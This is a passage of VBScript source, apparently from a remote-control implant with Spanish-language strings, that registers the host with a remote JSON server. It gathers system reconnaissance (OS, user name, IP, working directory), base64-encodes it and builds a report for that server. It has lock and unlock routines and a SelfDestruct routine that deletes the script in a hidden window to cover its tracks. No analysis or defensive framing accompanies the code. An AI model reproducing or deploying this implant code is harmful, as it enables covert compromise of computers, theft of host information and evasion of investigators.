        httpGet = xhr.responseText
    End If
    Set xhr = Nothing
End Function
Sub httpPut(url, body)
    On Error Resume Next
    Dim xhr
    Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then Exit Sub
    xhr.Open "PUT", url, False
    xhr.setRequestHeader "Content-Type", "application/json"
    xhr.send body
    Set xhr = Nothing
End Sub
Sub httpDelete(url)
    On Error Resume Next
    Dim xhr
    Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then Exit Sub
    xhr.Open "DELETE", url, False
    xhr.setRequestHeader "Content-Type", "application/json"
    xhr.send
    Set xhr = Nothing
End Sub
' ------------------------------------------------

Sub Cleanup()
    On Error Resume Next
    Dim url
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & ".json"
    httpDelete url
End Sub

Sub LockMachine()
    On Error Resume Next
    Dim url, payload
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    payload = """locked"""
    httpPut url, payload
End Sub

Sub UnlockMachine()
    On Error Resume Next
    Dim url
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    httpDelete url
End Sub

Sub SelfDestruct()
    On Error Resume Next
    Cleanup
    Dim scriptPath, cmd
    scriptPath = WScript.ScriptFullName
    cmd = "cmd.exe /c ping 127.0.0.1 -n 4 > nul & del """ & scriptPath & """"
    WshShell.Run cmd, 0, False
End Sub

Function GetSystemInfoJSON()
    On Error Resume Next
    Dim os, user, ip, output, lines, line, i, currentIp, gateway, initialCWD
    initialCWD = CreateObject("WScript.Shell").CurrentDirectory
    os = "Desconocido"
    os = CreateObject("WScript.Shell").RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
    user = CreateObject("WScript.Network").UserName
    ip = "No encontrada"
    currentIp = ""
    gateway = ""
    output = ExecCommand("ipconfig", "C:\")
    lines = Split(output, vbCrLf)
    For i = 0 To UBound(lines)
        line = Trim(lines(i))
        If InStr(line, "IPv4") > 0 And InStr(line, ":") > 0 Then
            Dim parts : parts = Split(line, ":")
            If UBound(parts) > 0 Then
                Dim tempIp : tempIp = Trim(parts(1))
                If InStr(tempIp, ".") > 0 Then currentIp = tempIp
            End If
        End If
        If InStr(line, "Puerta de enlace predeterminada") > 0 And InStr(line, ":") > 0 Then
            parts = Split(line, ":")
            If UBound(parts) > 0 Then
                gateway = Trim(parts(1))
                If gateway <> "" And currentIp <> "127.0.0.1" Then
                    ip = currentIp
                    Exit For
                End If
            End If
        End If
    Next
    If ip = "No encontrada" And currentIp <> "" And currentIp <> "127.0.0.1" Then ip = currentIp
    GetSystemInfoJSON = "{""os"":""" & JsonEscape(EncodeBase64(os)) & """,""user"":""" & JsonEscape(EncodeBase64(user)) & """,""ip"":""" & JsonEscape(EncodeBase64(ip)) & """,""cwd"":""" & JsonEscape(EncodeBase64(initialCWD)) & """}"
End Function

' --- Helpers JSON ---
Function JsonGetField(json, key)
    On Error Resume Next
    JsonGetField = ""
    Dim patt, re, m, k
    k = """" & key & """"
    patt = k & "\s*:\s*""([^""]*)"""
    Set re = New RegExp
    re.Pattern = patt
    re.IgnoreCase = True
    re.Global = False
    If re.Test(json) Then
        Set m = re.Execute(json)
        JsonGetField = m(0).SubMatches(0)
    End If
    Set re = Nothing
End Function
Function JsonEscape(s)
    On Error Resume Next
    If IsNull(s) Then s = ""
    s = Replace(s, "\", "\\")
    s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr, "\n")
    s = Replace(s, vbLf, "\n")
    s = Replace(s, vbTab, "\t")
    s = Replace(s, "/", "\/")
    JsonEscape = s
End Function

Function EncodeBase64(sIn)
    On Error Resume Next
    Dim oXML, oNode, bIn, oStream
    Set oStream = CreateObject("ADODB.Stream")
    If Err.Number <> 0 Then
        EncodeBase64 = "ERROR_BASE64"
        Exit Function
    End If
    oStream.Type = 2 
    oStream.Charset = "Windows-1252" 
    oStream.Open
    oStream.WriteText sIn
    oStream.Position = 0
    oStream.Type = 1 
    bIn = oStream.Read
    oStream.Close
    Set oStream = Nothing
    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set oNode = oXML.createElement("b64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = bIn
    EncodeBase64 = oNode.text
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function EncodeJsonKey(s)
    On Error Resume Next
    s = Replace(s, " ", "_")
    s = Replace(s, ".", "_")
    s = Replace(s, "$", "_")
    s = Replace(s, "[", "_")
    s = Replace(s, "]", "_")
    s = Replace(s, "#", "_")
    s = Replace(s, "/", "_")
    EncodeJsonKey = s
End Function

Function GetTimezoneBias()
    On Error Resume Next
    GetTimezoneBias = 0
    Dim objWMIService, colItems, objItem
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_TimeZone")
    For Each objItem in colItems
        GetTimezoneBias = objItem.Bias
        Exit For
    Next
    Set objWMIService = Nothing
    Set colItems = Nothing
    Set objItem = Nothing
End Function

Function GetEpochTime()
    On Error Resume Next
    Dim biasMinutes : biasMinutes = GetTimezoneBias()
    Dim localNow : localNow = Now()
    Dim utcNow : utcNow = DateAdd("n", biasMinutes, localNow)
    GetEpochTime = DateDiff("s", "01/01/1970 00:00:00", utcNow)
    If Err.Number <> 0 Then
        GetEpochTime = DateDiff("s", "01/01/1970 00:00:00", Now())
    End If
End Function